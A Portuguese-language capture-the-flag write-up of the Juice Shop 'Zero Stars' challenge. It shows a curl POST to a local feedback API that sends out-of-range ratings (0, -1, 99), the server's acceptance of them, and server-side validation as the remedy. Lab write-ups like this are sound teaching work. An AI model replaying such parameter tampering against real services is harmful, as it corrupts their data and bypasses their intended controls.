# Zero Estrelas na Avaliação

**Categoria:** Broken Access Control / Falta de validação server-side
**Dificuldade:** Fácil

## Contexto

Em `/#/contact`, somos apresentados ao formulário de envio de feedback do
consumidor. Nele, é possível selecionar manualmente de 1 a 5 estrelas e
escrever um comentário. O envio é feito por meio de uma requisição
`POST` HTTP carregando um JSON, por exemplo:

    {
      "UserId": 1,
      "captchaId": 1,
      "captcha": "104",
      "comment": "muito bom(***in@juice-sh.op)",
      "rating": 5
    }

## Vulnerabilidade

Apesar do front-end só permitir selecionar valores inteiros entre 1 e 5
para `rating`, essa restrição existe apenas na interface. Em outras
palavras, é possível enviar qualquer valor de avaliação.

## Exploração

Usando o Firefox, copiamos a requisição de POST como cURL direto do
monitor de rede (`Ctrl+Shift+E`), e alteramos o corpo do JSON antes de
reenviar pelo terminal:

    curl 'http://localhost:3000/api/Feedbacks/' \
      -X POST \
      -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:156.0) Gecko/20100101 Firefox/156.0' \
      -H 'Accept: application/json, text/plain, */*' \
      -H 'Content-Type: application/json' \
      [cookies, authorization dentre outros headers] \
      --data-raw '{"UserId":1,"captchaId":2,"captcha":"2","comment":"horrivel","rating":0}'

O campo `"rating":0"` é enviado e assim é feita uma avaliação fora
dos valores esperados. Também podemos enviar -1 ou 99, como nos casos
abaixo.

    --data-raw '{"UserId":1,"captchaId":2,"captcha":"2","comment":"aaaa","rating":-1}'
    --data-raw '{"UserId":1,"captchaId":2,"captcha":"2","comment":"aaaa","rating":99}'

## Resultado

O servidor aceita qualquer valor inteiro em `rating`, sem checagem de
limites. O retorno indica sucesso, mesmo para um valor como -1.

    {"status":"success","data":{"id":13,"UserId":1,"comment":"aaaa (***in@juice-sh.op)","rating":-1,"updatedAt":"2026-09-24T20:26:25.164Z","createdAt":"2026-09-24T20:26:25.164Z"}}
    {"status":"success","data":{"id":14,"UserId":1,"comment":"aaaa (***in@juice-sh.op)","rating":99,"updatedAt":"2026-09-24T20:26:43.895Z","createdAt":"2026-09-24T20:26:43.895Z"}}

Isso confirma que a validação de `rating` existe apenas no front-end. O
desafio é desbloqueado ao entrar com valor 0, mas os outros valores 
enviados são igualmente guardados.

## Remediação

Validar o campo `rating` no back-end antes de persistir, rejeitando
qualquer valor fora do intervalo esperado (1 a 5) com um erro, como
HTTP 400.

---

*Write-up feito em 24/09/2026*
